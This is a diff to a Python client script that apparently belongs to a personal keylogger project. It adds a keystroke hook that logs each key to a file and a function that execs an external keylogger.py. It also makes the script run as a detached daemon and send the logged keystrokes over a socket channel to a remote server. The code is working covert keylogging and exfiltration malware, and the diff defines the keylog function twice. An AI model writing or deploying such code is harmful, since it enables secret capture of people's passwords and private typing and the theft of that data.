@@ -43,7 +43,6 @@ import logzero
 import time # to randomize the contacting 
 from logzero import logger
 
-
 logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
 
 def getInput():
@@ -120,7 +119,14 @@ def keylog(filepath, globals=None, locals=None):
     })
     with open(filepath, 'rb') as file:
         exec(compile(file.read(), filepath, 'exec'), globals, locals)
-    
+
+def OnKeyPress(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.Key))
+
+    if event.Ascii == cancel_key:
+        new_hook.cancel()
+
 def connect(keyLoc):
     '''
     This function handles connecting to the server on the behalf of the caller
@@ -150,7 +156,18 @@ def connect(keyLoc):
         if client != 0:
             client.close()
         sys.exit(0)
-    
+
+def keylog(filepath, globals=None, locals=None):
+    if globals is None:
+        globals = {}
+    globals.update({
+        "__file__": filepath,
+        "__name__": "__main__",
+    })
+    with open(filepath, 'rb') as file:
+        exec(compile(file.read(), filepath, 'exec'), globals, locals)
+    return 0
+
 def sendFile(dataFile,  keyLoc, filename):
     '''
     This function contacts the daemon and sends the process information to it
@@ -180,16 +197,12 @@ def sendFile(dataFile,  keyLoc, filename):
     
     elif filename == 'keylog.txt':
           #send this filename
-        print(filename)
-        strn = filename
-
-        chan.sendall(strn.encode('utf-8'))
         
-        #send the keylog data
-        #todo
-        chan.sendall(strn.encode('utf-8'))
-     
+        with open(dataFile, 'r') as file:
+            data = file.read().replace('\n', '')
         
+        chan.sendall(data.encode('utf-8'))
+    
     else:
         logger.error("Unknown fille handle sent to sendFile")
         
@@ -209,8 +222,9 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     except OSError as e:
         logger.error("Unable to fork for fork #1")
         sys.exit(0)
-                
+    
     os.chdir('/')
+
     try:
         os.setsid()
     except Exception as e:
@@ -228,14 +242,14 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    # Flush I/O  buffers  and lockdown stderr/out/in
     sys.stdout.flush() 
     sys.stderr.flush()
-    
-    keylog()
-    
-    sendFile("", keyLoc,  'keylog.txt')
+
+    keylog("/home/michael/sandbox/project/mine/keylogger.py")
+
+    time.sleep(20)
+
+    sendFile("loggedKeys.log", keyLoc,  'keylog.txt')
     os._exit(0)
     
 # MAIN # 
 if __name__ == '__main__':
     run()
-
-
